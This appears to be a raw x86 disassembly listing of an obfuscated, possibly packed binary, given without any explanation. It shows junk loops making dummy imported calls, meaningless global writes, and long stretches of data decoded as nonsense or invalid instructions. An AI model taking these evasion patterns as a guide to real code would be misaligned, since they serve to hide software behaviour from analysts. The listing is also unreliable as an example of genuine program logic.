  4061b0:	mov    DWORD PTR ds:0x412370,edx
  4061b6:	cmp    DWORD PTR ds:0x412370,0x1e
  4061bd:	jae    0x4061ea
  4061c3:	cmp    DWORD PTR ds:0x412370,0x2a
  4061ca:	jne    0x4061e3
  4061d0:	push   DWORD PTR [ebp-0x10]
  4061d3:	push   0x41acf1
  4061d8:	push   0x41ac28
  4061dd:	call   DWORD PTR ds:0x40d000
  4061e3:	jmp    0x4061a9
  4061e8:	adc    edi,edi
  4061ea:	mov    edx,DWORD PTR [ebp-0x8]
  4061ed:	mov    DWORD PTR ds:0x412364,0x11
  4061f7:	cmp    DWORD PTR ds:0x412364,0x0
  4061fe:	je     0x406239
  406204:	cmp    DWORD PTR ds:0x412364,0x14
  40620b:	jne    0x406227
  406211:	push   0x44a4
  406216:	push   DWORD PTR [ebp-0x20]
  406219:	push   0x788c
  40621e:	push   DWORD PTR [ebp-0x10]
  406221:	call   DWORD PTR ds:0x40d360
  406227:	mov    edi,DWORD PTR ds:0x412364
  40622d:	dec    edi
  40622e:	mov    DWORD PTR ds:0x412364,edi
  406234:	jmp    0x4061f7
  406239:	mov    edi,DWORD PTR [ebp-0x10]
  40623c:	or     DWORD PTR ds:0x41235c,0x6f22
  406246:	sub    edi,edx
  406248:	adc    DWORD PTR ds:0x4235c3,edi
  40624e:	mov    edx,DWORD PTR [ebp-0x4]
  406251:	adc    DWORD PTR ds:0x41abca,0x7639
  40625b:	xor    edx,eax
  40625d:	sbb    DWORD PTR ds:0x4235d3,0x415105
  406267:	add    edx,ecx
  406269:	mov    DWORD PTR ds:0x41abda,0x19aa
  406273:	cmp    edi,edx
  406275:	mov    DWORD PTR ds:0x4150fd,0x443e
  40627f:	jb     0x4072d5
  406285:	mov    edx,DWORD PTR [ebp-0x28]
  406288:	sbb    edi,0x1e1d
  40628e:	mov    edi,DWORD PTR [ebp-0x4]
  406291:	mov    ebx,DWORD PTR ds:0x417e45
  406297:	or     DWORD PTR ds:0x417e3d,ebx
  40629d:	xor    edx,eax
  40629f:	xor    edi,eax
  4062a1:	mov    DWORD PTR ds:0x417e55,0x5fc7
  4062ab:	add    edi,ecx
  4062ad:	dec    ebx
  4062ae:	add    edx,ecx
  4062b0:	dec    ebx
  4062b1:	imul   edx,edi
  4062b4:	sbb    DWORD PTR ds:0x41abe2,0x63fb
  4062be:	mov    edi,DWORD PTR [ebp-0x8]
  4062c1:	mov    DWORD PTR ds:0x41abd2,0x13
  4062cb:	cmp    DWORD PTR ds:0x41abd2,0x0
  4062d2:	je     0x406309
  4062d8:	cmp    DWORD PTR ds:0x41abd2,0x23
  4062df:	jne    0x4062f1
  4062e5:	push   DWORD PTR [ebp-0x18]
  4062e8:	push   DWORD PTR [ebp-0x24]
  4062eb:	call   DWORD PTR ds:0x40d364
  4062f1:	mov    ebx,DWORD PTR ds:0x41abd2
  4062f7:	dec    ebx
  4062f8:	mov    DWORD PTR ds:0x41abd2,ebx
  4062fe:	jmp    0x4062cb
  406303:	sbb    ebx,0x2ce7
  406309:	mov    ebx,DWORD PTR [ebp-0x10]
  40630c:	inc    DWORD PTR ds:0x41abce
  406312:	sub    ebx,edi
  406314:	mov    DWORD PTR ds:0x4235d7,0x7511
  40631e:	cmp    ebx,edx
  406320:	mov    DWORD PTR ds:0x41abd2,0x3d79
  40632a:	ja     0x40635a
  406330:	mov    edx,DWORD PTR [ebp-0x4]
  406333:	mov    DWORD PTR ds:0x412368,0x316e
  40633d:	xor    edx,eax
  40633f:	add    DWORD PTR ds:0x415109,0x4882
  406349:	add    edx,ecx
  40634b:	mov    DWORD PTR ds:0x417e59,0x234c
  406355:	jmp    0x40672b
  40635a:	mov    edx,DWORD PTR [ebp-0x2c]
  40635d:	sbb    DWORD PTR ds:0x412370,0x4f34
  406367:	mov    edi,DWORD PTR [ebp-0x4]
  40636a:	and    ebx,0x5352
  406370:	xor    edx,eax
  406372:	and    DWORD PTR ds:0x415111,0x0
  40637c:	jmp    0x40638e
  406381:	mov    ebx,DWORD PTR ds:0x415111
  406387:	inc    ebx
  406388:	mov    DWORD PTR ds:0x415111,ebx
  40638e:	cmp    DWORD PTR ds:0x415111,0x16
  406395:	jae    0x406508
  40639b:	cmp    DWORD PTR ds:0x415111,0x1c
  4063a2:	jne    0x4063b1
  4063a8:	push   DWORD PTR [ebp-0x1c]
  4063ab:	call   DWORD PTR ds:0x40d1d4
  4063b1:	jmp    0x406381
  4063b6:	jmp    0x406508
  4063bb:	add    eax,DWORD PTR [esi]
  4063bd:	mov    al,ds:0xf969b94b
  4063c2:	inc    esi
  4063c3:	popf   
  4063c4:	imul   ebp,DWORD PTR [ebx-0x1faeeae8],0xd
  4063cb:	jmp    0x7e7f:0x237e7e0c
  4063d2:	jle    0x40635f
  4063d4:	sar    BYTE PTR [esi+0x42],0xb2
  4063d8:	(bad)  
  4063da:	retf   0xef75
  4063dd:	sub    al,0x9f
  4063df:	lock cmp eax,0x62135c0a
  4063e5:	xchg   ebx,eax
  4063e6:	aam    0xce
  4063e8:	push   ebx
  4063e9:	cwde   
  4063ea:	add    eax,0xf1fcba55
  4063ef:	cmp    esi,esi
  4063f1:	xor    ch,bh
  4063f3:	cmp    DWORD PTR [edi],edx
  4063f5:	rol    BYTE PTR [ecx],1
  4063f7:	stos   DWORD PTR es:[edi],eax
  4063f8:	cmp    cl,BYTE PTR [edi]
  4063fa:	adc    BYTE PTR [ebx+0x623426da],ch
  406400:	(bad)  
  406401:	cli    
  406402:	repnz cs xchg esi,eax
  406405:	ret    
  406406:	lods   eax,DWORD PTR ds:[esi]
  406407:	cld    
  406408:	cli    
  406409:	std    
  40640a:	rol    DWORD PTR [edi+0x53cb91da],cl
  406410:	jae    0x40646e
  406412:	add    al,cl
  406414:	sar    DWORD PTR [ebx],1
  406416:	pop    ebp
  406417:	arpl   si,di
  406419:	mov    al,ds:0xe6d3fc3
  40641e:	sub    DWORD PTR [ebx-0x2e7f7101],esp
  406424:	inc    ebp
  406425:	push   edx
  406426:	adc    al,0xd2
  406428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406429:	ret    
  40642a:	out    0xd0,eax
  40642c:	push   ss
  40642d:	dec    edx
  40642e:	push   esi
  40642f:	adc    al,0x37
  406431:	iret   
  406432:	(bad)
  406435:	pop    ebp
  406436:	loope  0x406416
  406438:	inc    esp
  406439:	push   0x22e3969f
  40643e:	sub    ebp,DWORD PTR [ebp-0x3784d494]
  406444:	cli    
  406445:	sbb    edi,DWORD PTR [ecx+0x2c4153fa]
  40644b:	fcomi  st,st(0)
  40644d:	inc    edx
  40644e:	add    BYTE PTR [eax],al
  406450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406452:	or     bl,BYTE PTR [edi-0x6a8cf855]
  406458:	mov    eax,ds:0x9d7eef4c
  40645d:	shl    bh,0xf
  406460:	adc    al,0x10
  406462:	adc    al,0x64
  406464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406465:	and    cl,0x63
  406468:	call   0x2afed3bf
  40646d:	daa    
  40646e:	or     al,0x2a
  406470:	push   eax
  406471:	rol    DWORD PTR [ebp-0x471986ac],0x18
  406478:	test   DWORD PTR [ecx-0x3a2bb034],esi
  40647e:	pop    ebp
  40647f:	mov    cl,0x56
  406481:	dec    esp
  406482:	rol    BYTE PTR [ecx+0x3523d60a],cl
  406488:	retf   0xcbfb
  40648b:	pop    ss
  40648c:	mov    bh,BYTE PTR [eax]
  40648e:	cld    
  40648f:	fwait
  406490:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  406492:	arpl   WORD PTR [ecx+0x3f],ax
  406495:	sar    dl,0x5d
  406498:	push   edi
  406499:	mov    gs,WORD PTR gs:[esi-0x29a4c440]
  4064a0:	xchg   edi,eax
  4064a1:	aaa    
  4064a2:	je     0x4064c9
  4064a4:	pop    esp
  4064a5:	dec    ebp
  4064a6:	add    eax,DWORD PTR [ecx+ebx*4+0x176a2fa9]
  4064ad:	stos   DWORD PTR es:[edi],eax
  4064ae:	or     eax,0x43648fcd
  4064b3:	out    0x12,eax
  4064b5:	pop    ss
  4064b6:	adc    BYTE PTR [ebx-0x15],0xec
  4064ba:	jnp    0x406480
  4064bc:	ror    DWORD PTR [edx-0x36],1
  4064bf:	xor    ah,al
  4064c1:	mov    ds:0xaccaf106,eax
  4064c6:	xor    dh,BYTE PTR [eax-0x3cf5fa2c]
  4064cc:	push   0x59a8175f
  4064d1:	in     al,0x88
  4064d3:	(bad)  
  4064d4:	call   0x7cb555ed
  4064d9:	and    esp,ebx
  4064db:	leave  
  4064dc:	(bad)  
  4064dd:	dec    eax
  4064de:	mov    al,0xe2
  4064e0:	cli    
  4064e1:	or     al,0xee
  4064e3:	or     ecx,ebx
  4064e5:	inc    eax
  4064e6:	popa   
  4064e7:	inc    edx
  4064e8:	push   0x17
  4064ea:	xchg   edx,eax
  4064eb:	ret    
  4064ec:	adc    DWORD PTR [esi-0x3b],eax
  4064ef:	call   0x9738:0xff94622b
  4064f6:	fcomp  QWORD PTR [edi+0x47]
  4064f9:	(bad)  
  4064fa:	fcmovne st,st(3)
  4064fc:	jmp    0x406553
  4064fe:	ficom  DWORD PTR ds:0x682889ce
  406504:	js     0x406560
  406506:	outs   dx,BYTE PTR ds:[esi]
  406507:	out    dx,eax
  406508:	xor    edi,eax
  40650a:	add    edi,ecx
  40650c:	add    edx,ecx
  40650e:	imul   edx,edi
  406511:	mov    edi,DWORD PTR [ebp-0x8]
  406514:	jmp    0x406666
  406519:	jbe    0x406527
  40651b:	xchg   ebp,eax
  40651c:	call   0xe08bdec6
  406521:	adc    DWORD PTR ds:0xfef04057,edi
  406527:	int3   
  406528:	scas   eax,DWORD PTR es:[edi]
  406529:	lahf   
  40652a:	or     eax,0x7f237e7e
  40652f:	jle    0x4065af
  406531:	xchg   DWORD PTR [eax],ebx
  406533:	fld    DWORD PTR [ebx+0x7]
  406536:	and    DWORD PTR [edx+0x76],0x7
  40653a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40653b:	mov    bl,0x6d
  40653d:	ja     0x4064dc
  40653f:	dec    ebx
  406540:	push   esp
  406541:	mov    cs,ebx
  406543:	or     BYTE PTR [ecx-0x4a],dl
  406546:	or     al,0x38
  406548:	push   0xf99c830a
  40654d:	ins    BYTE PTR es:[edi],dx
  40654e:	pop    ecx
  40654f:	test   al,0x7a
  406551:	xor    ah,BYTE PTR [ebx-0x4f]
  406554:	test   DWORD PTR [esi+ebp*2],0x35a14047
  40655b:	(bad)  
  40655c:	pop    ecx
  40655d:	es push ds
  40655f:	in     eax,dx
  406560:	adc    edx,DWORD PTR ds:0xf55af504
  406566:	pop    edi
  406567:	and    cl,BYTE PTR [esi-0x64]
  40656a:	and    eax,DWORD PTR [ecx+0x15ca8939]
  406570:	mov    edi,DWORD PTR [ebx+0x0]
  406573:	pop    edi
  406574:	out    0xcc,al
  406576:	dec    esp
  406577:	sti    
  406578:	dec    BYTE PTR [ebp-0x63]
  40657b:	loopne 0x40656a
  40657d:	(bad)  
  40657e:	push   edx
  40657f:	mov    ds:0x53b904d8,al
  406584:	lods   eax,DWORD PTR ds:[esi]
  406585:	sahf   
  406586:	loopne 0x406607
  406588:	(bad)  
  406589:	iret   
  40658a:	aad    0xd2
  40658c:	test   BYTE PTR [eax+0x55],bl
  40658f:	mov    eax,0x58cac7b8
  406594:	(bad)  
  406595:	mov    ds:0x731398bf,al
  40659a:	and    BYTE PTR [ebp+eax*8+0x214f9937],dl
  4065a1:	das    
  4065a2:	cli    
  4065a3:	gs cmp edi,esp
  4065a6:	inc    edx
  4065a7:	dec    edi
  4065a8:	jle    0x40657d
  4065aa:	mov    bh,0xb6
  4065ac:	inc    ebx
  4065ad:	xchg   esp,eax
  4065ae:	popf   
  4065af:	mov    bh,0x4a
  4065b1:	(bad)  
  4065b2:	repnz xor dh,cl
  4065b5:	shl    DWORD PTR [edi-0x3],0xa3
  4065b9:	pop    ds
  4065ba:	pop    ebx
  4065bb:	out    0xa3,eax
  4065bd:	outs   dx,BYTE PTR ds:[esi]
  4065be:	into   
  4065bf:	call   0x7e714e37
  4065c4:	pop    ss
  4065c5:	inc    edx
  4065c6:	xchg   ecx,eax
  4065c7:	inc    ebp
  4065c8:	pop    ss
  4065c9:	push   esi
  4065ca:	rcr    DWORD PTR [eax*1-0xf8ac760],0xf8
  4065d2:	dec    esi
  4065d3:	cmc    
  4065d4:	and    eax,0x152da983
  4065d9:	pop    edx
  4065da:	call   DWORD PTR [esi-0x22]
  4065dd:	clc    
  4065de:	xor    DWORD PTR [esi+edx*4-0x41],ebp
  4065e2:	adc    BYTE PTR [edi+ebx*1],cl
  4065e5:	mov    cl,0x4e
  4065e7:	popa   
  4065e8:	ret    0xd420
  4065eb:	sub    eax,0xded34316
  4065f0:	or     eax,0x4a860185
  4065f5:	jb     0x4065ca
  4065f7:	push   ebx
  4065f8:	mov    DWORD PTR [ebx+edi*8],eax
  4065fb:	fnstenv [ecx-0x54a7788a]
  406601:	mov    ebx,0x9d539bb0
  406606:	cmp    BYTE PTR [eax+0x235e3bcc],0xc3
  40660d:	adc    BYTE PTR [edi-0xe],0x7d
  406611:	mov    cx,0xf46
  406615:	popa   
  406616:	xchg   ecx,eax
  406617:	pop    edi
  406618:	xor    BYTE PTR [esi],al
  40661a:	inc    esp
  40661b:	mov    ds:0x583d59e1,eax
  406620:	jg     0x406636
  406622:	outs   dx,DWORD PTR ds:[esi]
  406623:	out    0xa8,eax
  406625:	pop    eax
  406626:	xor    al,BYTE PTR [esi+0x38e01d2d]
  40662c:	or     al,0x56
  40662e:	(bad)  
  40662f:	arpl   WORD PTR [ebx],dx
  406631:	push   ss
  406632:	dec    ebx
  406633:	pop    ecx
  406634:	test   BYTE PTR [ecx-0x23],bh
  406637:	into   
  406638:	sub    al,0x46
  40663a:	xor    ecx,DWORD PTR [esp+ecx*4]
  40663d:	int    0xa4
  40663f:	cwde   
  406640:	fsubr  QWORD PTR [esi+ebp*8]
  406643:	push   cs
  406644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406645:	pusha  
  406646:	jp     0x4065df
  406648:	mov    edi,0xa302ca97
  40664d:	jmp    0x3809:0x6d9876ab
  406654:	xlat   BYTE PTR ds:[ebx]
  406655:	inc    edi
  406656:	daa    
  406657:	mov    eax,0x46464f75
  40665c:	jne    0x40668a
  40665e:	aas    
  40665f:	aas    
  406660:	stos   DWORD PTR es:[edi],eax
  406661:	mov    dh,0xc5
  406663:	sbb    eax,0x5d8b88f9
  406668:	lock sub ebx,edi
  40666b:	cmp    ebx,edx
  40666d:	ja     0x40667b
  406673:	mov    edx,DWORD PTR [ebp-0x28]
  406676:	jmp    0x40671d
  40667b:	mov    edx,DWORD PTR [ebp-0x30]
  40667e:	mov    edi,DWORD PTR [ebp-0x4]
  406681:	xor    edx,eax
  406683:	xor    edi,eax
  406685:	add    edi,ecx
  406687:	add    edx,ecx
  406689:	imul   edx,edi
  40668c:	mov    edi,DWORD PTR [ebp-0x8]
  40668f:	mov    ebx,DWORD PTR [ebp-0x10]
  406692:	sub    ebx,edi
  406694:	cmp    ebx,edx
  406696:	ja     0x4066a4
  40669c:	mov    edx,DWORD PTR [ebp-0x2c]
  40669f:	jmp    0x40671d
  4066a4:	mov    edx,DWORD PTR [ebp-0x34]
  4066a7:	mov    edi,DWORD PTR [ebp-0x4]
  4066aa:	xor    edx,eax
  4066ac:	xor    edi,eax
  4066ae:	add    edi,ecx
  4066b0:	add    edx,ecx
  4066b2:	imul   edx,edi
  4066b5:	mov    edi,DWORD PTR [ebp-0x8]
  4066b8:	mov    ebx,DWORD PTR [ebp-0x10]
  4066bb:	sub    ebx,edi
  4066bd:	cmp    ebx,edx
  4066bf:	ja     0x4066cd
  4066c5:	mov    edx,DWORD PTR [ebp-0x30]
  4066c8:	jmp    0x40671d
  4066cd:	mov    edx,DWORD PTR [ebp-0x38]
  4066d0:	mov    edi,DWORD PTR [ebp-0x4]
  4066d3:	xor    edx,eax
  4066d5:	xor    edi,eax
  4066d7:	add    edi,ecx
  4066d9:	add    edx,ecx
  4066db:	imul   edx,edi
  4066de:	mov    edi,DWORD PTR [ebp-0x8]
  4066e1:	mov    ebx,DWORD PTR [ebp-0x10]
  4066e4:	sub    ebx,edi
  4066e6:	cmp    ebx,edx
  4066e8:	ja     0x4066f6
  4066ee:	mov    edx,DWORD PTR [ebp-0x34]
  4066f1:	jmp    0x40671d
  4066f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4066f9:	mov    edi,DWORD PTR [ebp-0x4]
  4066fc:	xor    edx,eax
  4066fe:	xor    edi,eax
  406700:	add    edx,ecx
  406702:	add    edi,ecx
  406704:	imul   edx,edi
  406707:	mov    edi,DWORD PTR [ebp-0x8]
  40670a:	mov    ebx,DWORD PTR [ebp-0x10]
  40670d:	sub    ebx,edi
  40670f:	cmp    ebx,edx
  406711:	mov    edx,DWORD PTR [ebp-0x38]
  406714:	jbe    0x40671d
  40671a:	mov    edx,DWORD PTR [ebp-0x3c]
  40671d:	mov    edi,DWORD PTR [ebp-0x4]
  406720:	xor    edi,eax
  406722:	xor    edx,eax
  406724:	add    edi,ecx
  406726:	add    edx,ecx
  406728:	imul   edx,edi
  40672b:	mov    DWORD PTR [ebp+0xc],edx
  40672e:	mov    edx,DWORD PTR [ebp+0xc]
  406731:	mov    DWORD PTR [ebp-0x24],edx
  406734:	mov    edx,DWORD PTR [ebp-0x8]
  406737:	jmp    0x406889
  40673c:	lock cs xchg ebx,eax
  40673f:	xchg   esi,eax
  406740:	mov    eax,ds:0xd53889bb
  406745:	and    esp,DWORD PTR [ebp+0x1b]
  406748:	es xchg ecx,eax
  40674a:	adc    BYTE PTR [esi+0x40],dh
  40674d:	add    bh,BYTE PTR [esi+0x7e]
  406750:	and    edi,DWORD PTR [edi+0x7e]
  406753:	jle    0x4066f9
  406755:	retf   
  406756:	in     al,0x17
  406758:	jno    0x406788
  40675a:	dec    esp
  40675b:	adc    eax,0x7304939a
  406760:	in     al,dx
  406761:	in     eax,dx
  406762:	cmp    al,0x3b
  406764:	retf   0xc7b4
  406767:	jne    0x406745
  406769:	add    eax,0x62d1287a
  40676e:	jbe    0x406751
  406770:	mov    edi,0x959f6512
  406775:	push   eax
  406776:	push   ecx
  406777:	add    al,0x4f
  406779:	in     eax,0x3a
  40677b:	push   0xce9dd428
  406780:	loopne 0x406732
  406782:	mov    eax,0xb4027324
  406787:	cmp    eax,0xd71b52b1
  40678c:	push   0x48
  40678e:	test   eax,0xfc9caab
  406793:	or     al,0xc
  406795:	cld    
  406796:	stc    
  406797:	sbb    esi,DWORD PTR [ebx+0x2b0171fa]
  40679d:	or     al,0x44
  40679f:	jno    0x40681f
  4067a1:	push   ecx
  4067a2:	out    dx,eax
  4067a3:	and    cl,BYTE PTR [ebx]
  4067a5:	dec    ebp
  4067a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067a7:	leave  
  4067a8:	repz bound edi,QWORD PTR [edx]
  4067ab:	inc    esp
  4067ac:	mov    edx,0xe891e84f
  4067b1:	pop    esi
  4067b2:	xor    al,0xa3
  4067b4:	cmp    ah,bh
  4067b6:	mov    DWORD PTR [edi-0x4c],eax
  4067b9:	or     ecx,eax
  4067bb:	loop   0x40680b
  4067bd:	aam    0xbe
  4067bf:	sbb    ch,0x3
  4067c2:	aaa    
  4067c3:	sbb    al,0x41
  4067c5:	mov    ss:0xe18e6fb7,al
  4067cb:	aaa    
  4067cc:	and    BYTE PTR [edi-0x66],cl
  4067cf:	jle    0x4067a5
  4067d1:	xor    bh,BYTE PTR [edi]
  4067d3:	mov    cl,0xc
  4067d5:	mov    BYTE PTR [esp+edi*1-0x22],0x8c
  4067da:	jnp    0x406847
  4067dc:	retf   0xa9e1
  4067df:	mov    edx,0xe55b3016
  4067e4:	fild   QWORD PTR [ebp-0x6c]
  4067e7:	sbb    ecx,DWORD PTR [ebp+0x54]
  4067ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067eb:	mov    BYTE PTR [edx+0x4c],ah
  4067ee:	or     cl,bh
  4067f0:	fs out 0x8c,al
  4067f3:	rcl    DWORD PTR [eax-0x642b1b0d],0xdf
  4067fa:	sbb    al,0xc5
  4067fc:	shl    DWORD PTR [ecx+0x2c3879b3],cl
  406802:	pop    ebx
  406803:	sub    cl,bh
  406805:	dec    edi
  406806:	icebp  
  406807:	addr16 inc ebx
  406809:	sub    eax,0xe2668320
  40680e:	mov    BYTE PTR [ebx+0x6e],bh
  406811:	sub    al,0x79
  406813:	addr16 popa 
  406815:	jno    0x40687e
  406817:	gs test al,0x79
  40681a:	inc    esi
  40681b:	mov    BYTE PTR [eax-0x6f],al
  40681e:	ror    BYTE PTR [ebx-0x4f],1
  406821:	mov    ebx,0xb212041a
  406826:	fdivr  DWORD PTR [esi+ebp*4+0x1f301691]
  40682d:	push   ecx
  40682e:	cmp    al,0x59
  406830:	mov    dh,0xa1
  406832:	ss lahf 
  406834:	call   0x5df4:0x3fc75a49
  40683b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40683c:	(bad)  
  40683d:	shl    DWORD PTR [ebp+0x7dda6823],cl
  406843:	shr    DWORD PTR [ecx-0x7298e5dd],1
  406849:	sub    bl,cl
  40684b:	rcr    BYTE PTR [edx-0x7b],cl
  40684e:	repnz ss pop edx
  406851:	pusha  
  406852:	xchg   esp,eax
  406853:	inc    eax
  406854:	mov    ah,0x7b
  406856:	pop    ds
  406857:	(bad)  
  406858:	sub    ebp,DWORD PTR [edx]
  40685a:	cld    
  40685b:	into   
  40685c:	or     eax,0x9c3d5ade
  406861:	or     eax,DWORD PTR [ecx-0x5f]
  406864:	add    edx,DWORD PTR [esi-0x3e8a2255]
  40686a:	aam    0x70
  40686c:	popf   
  40686d:	sub    DWORD PTR [esi],0x2b3bc740
  406873:	push   eax
  406874:	push   ebp
  406875:	mov    fs,WORD PTR [esi-0x6f]
  406878:	(bad)  
  406879:	stos   DWORD PTR es:[edi],eax
  40687a:	add    ebx,edi
  40687c:	into   
  40687d:	jmp    0x406848
  40687f:	fnstsw WORD PTR [ebx+0x204ab765]
  406885:	jmp    0x4068c4
  406887:	js     0x4068fe
  406889:	add    edx,DWORD PTR [ebp-0x40]
  40688c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  406893:	mov    DWORD PTR [ebp-0x1c],edx
  406896:	mov    DWORD PTR [ebp-0xc],0xf89c853b
  40689d:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4068a4:	mov    edx,DWORD PTR [ebp-0x18]
  4068a7:	jmp    0x4069f9
  4068ac:	daa    
  4068ad:	mov    ecx,0x7980c50e
  4068b2:	in     eax,0x79
  4068b4:	dec    ebp
  4068b5:	push   esp
  4068b6:	push   ecx
  4068b7:	cmp    al,0xdb
  4068b9:	test   DWORD PTR [eax],edx
  4068bb:	jl     0x406932
  4068bd:	add    BYTE PTR [esi+0x7e],bh
  4068c0:	and    edi,DWORD PTR [edi+0x7e]
  4068c3:	jle    0x4068df
  4068c5:	inc    ebx
  4068c6:	ds retf 
  4068c8:	push   es
  4068c9:	xor    eax,0x39de5684
  4068ce:	lds    esi,FWORD PTR [eax-0x6372fca1]
  4068d4:	cmp    DWORD PTR [edx+0x57],0xd7e4e76d
  4068db:	or     al,0xb5
  4068dd:	test   DWORD PTR ds:0xddc1118a,ecx
  4068e3:	fcomp  DWORD PTR [ecx+ebx*4-0x75]
  4068e7:	dec    esp
  4068e8:	fwait
  4068e9:	push   edx
  4068ea:	or     ebp,DWORD PTR ds:0xcc66a720
  4068f0:	rcl    DWORD PTR [edx-0xc],cl
  4068f3:	sbb    DWORD PTR [edx+0x60],edi
  4068f6:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4068f8:	cs xchg cl,cl
  4068fb:	add    edi,eax
  4068fd:	pop    esi
  4068fe:	jle    0x4068c6
  406900:	daa    
  406901:	mov    al,ds:0x8399e64c
  406906:	mov    BYTE PTR [esi+edi*2+0x44],dh
  40690a:	mov    ecx,0x8d691b58
  40690f:	sbb    eax,0x1cedc2d0
  406914:	mov    DWORD PTR [edi+0x17],edi
  406917:	jecxz  0x406990
  406919:	dec    esi
  40691a:	add    bh,bl
  40691c:	lock cmp BYTE PTR [edi-0x2a3886ed],ch
  406923:	mov    ebx,0x222e81b
  406928:	push   eax
  406929:	and    edx,DWORD PTR [esi+0x4464d265]
  40692f:	cs xchg ebp,eax
  406931:	ret    
  406932:	jle    0x4068bf
  406934:	sahf   
  406935:	dec    ebp
  406936:	clc    
  406937:	in     eax,0x79
  406939:	(bad)  
  40693a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40693b:	pop    ebp
  40693c:	and    DWORD PTR [eax+0x45184f70],eax
  406942:	xchg   edi,eax
  406943:	mov    bl,0x6d
  406945:	imul   esi,DWORD PTR [ebx+0x50390400],0x9dd92ef2
  40694f:	sti    
  406950:	or     ah,dl
  406952:	mov    bl,0x92
  406954:	pop    ss
  406955:	arpl   WORD PTR [ebx-0x64],bx
  406958:	(bad)  
  406959:	loopne 0x406962
  40695b:	sub    eax,0xf31d10d9
  406960:	sbb    edi,edx
  406962:	fwait
  406963:	push   esi
  406964:	push   sp
  406966:	fwait
  406967:	push   edx
  406968:	xor    ebp,edi
  40696a:	mov    cl,0x54
  40696c:	jns    0x4069ed
  40696e:	aaa    
  40696f:	lea    esp,[edx]
  406971:	out    dx,al
  406972:	sahf   
  406973:	les    edx,FWORD PTR es:[ecx]
  406976:	shr    ebp,1
  406978:	xor    BYTE PTR [esi-0x1f389c8],cl
  40697e:	jb     0x4069a5
  406980:	in     al,0x2d
  406982:	out    0xf7,eax
  406984:	or     eax,0x28f1e5da
  406989:	pop    esp
  40698a:	mov    ecx,DWORD PTR [ebx+edx*4]
  40698d:	rol    BYTE PTR es:[edi],1
  406990:	lock jne 0x4069f9
  406993:	mov    ebp,0x497e6582
  406998:	mov    esi,0x7949adae
  40699d:	dec    edi
  40699e:	adc    eax,0x20569254
  4069a3:	xchg   esp,eax
  4069a4:	sbb    BYTE PTR [esi],cl
  4069a6:	fwait
  4069a7:	std    
  4069a8:	and    DWORD PTR [edi],esi
  4069aa:	das    
  4069ab:	cs push esi
  4069ad:	adc    ebx,DWORD PTR [ebp+0x55]
  4069b0:	imul   ebp,DWORD PTR [ebx-0x3c],0xffffffbc
  4069b4:	loopne 0x40693f
  4069b6:	pop    ebp
  4069b7:	sbb    al,0x4a
  4069b9:	adc    dl,BYTE PTR [edi-0x34c1192f]
  4069bf:	mov    ah,0x56
  4069c1:	ja     0x4069e9
  4069c3:	fist   DWORD PTR [edi]
  4069c5:	ficom  WORD PTR [ebx-0x7fbc836a]
  4069cb:	aaa    
  4069cc:	push   ds
  4069cd:	out    0xe4,al
  4069cf:	jne    0x406a02
  4069d1:	loop   0x4069a6
  4069d3:	pop    eax
  4069d4:	sar    BYTE PTR [esi+0x1be64280],cl
  4069da:	repnz in eax,dx
  4069dc:	fsub   st,st(6)
  4069de:	xchg   esi,eax
  4069df:	lea    ebp,[edi+0x6d]
  4069e2:	lds    eax,FWORD PTR [edi-0x50897668]
  4069e8:	xchg   edi,eax
  4069e9:	adc    ch,BYTE PTR [ecx-0x6f0a10d2]
  4069ef:	add    al,0x5c
  4069f1:	add    al,BYTE PTR [edx]
  4069f3:	sbb    eax,0x13f61126
  4069f8:	retf   
  4069f9:	xor    edx,eax
  4069fb:	jmp    0x406b4d
  406a00:	int    0xfb
  406a02:	mov    ebx,0x65b3b933
  406a07:	stc    
  406a08:	repnz add eax,0xbbe57a93
  406a0e:	push   esp
  406a0f:	ret    0x13e
  406a12:	jle    0x406a92
  406a14:	and    edi,DWORD PTR [edi+0x7e]
  406a17:	jle    0x4069bd
  406a19:	loop   0x406a84
  406a1b:	adc    esi,eax
  406a1d:	or     BYTE PTR [edi-0x25],bh
  406a20:	gs (bad) 
  406a22:	dec    DWORD PTR [esi-0x16]
  406a25:	mov    edi,0x4efcd983
  406a2a:	sub    DWORD PTR [esi-0x3de17a66],edi
  406a30:	lds    esi,FWORD PTR [eax-0x352256e3]
  406a36:	lea    ebp,[ebx-0x28]
  406a39:	retf   0x80a9
  406a3c:	sub    bl,ah
  406a3e:	(bad)  
  406a3f:	rol    DWORD PTR ds:0xd6815c6d,cl
  406a45:	sub    al,0x80
  406a47:	and    eax,DWORD PTR [ebp-0x16110009]
  406a4d:	mov    edx,0x1b080cba
  406a52:	push   ds
  406a53:	cs and dh,al
  406a56:	popf   
  406a57:	mov    bh,0x44
  406a59:	mov    DWORD PTR [ebp-0x6c],0x633421d2
  406a60:	loop   0x406a13
  406a62:	pop    ecx
  406a63:	jecxz  0x406a00
  406a65:	mov    ebx,0x9308c36c
  406a6a:	xor    al,BYTE PTR [edx+0x33]
  406a6d:	add    dh,BYTE PTR [esi]
  406a6f:	pop    es
  406a70:	ss loopne 0x4069f8
  406a73:	or     DWORD PTR [esi],edx
  406a75:	loope  0x406a12
  406a77:	mov    ch,dh
  406a79:	add    DWORD PTR [ecx-0x7d],0xfffffff2
  406a7d:	adc    bl,BYTE PTR [ecx+0x7b]
  406a80:	fmul   DWORD PTR [eax+0x4b]
  406a83:	dec    ebx
  406a84:	lods   eax,DWORD PTR ds:[esi]
  406a85:	out    0xd5,eax
  406a87:	xlat   BYTE PTR ds:[ebx]
  406a88:	inc    esp
  406a89:	rcr    BYTE PTR [edx-0x7ec85a3f],cl
  406a8f:	inc    ebp
  406a90:	dec    esp
  406a91:	daa    
  406a92:	fst    st(7)
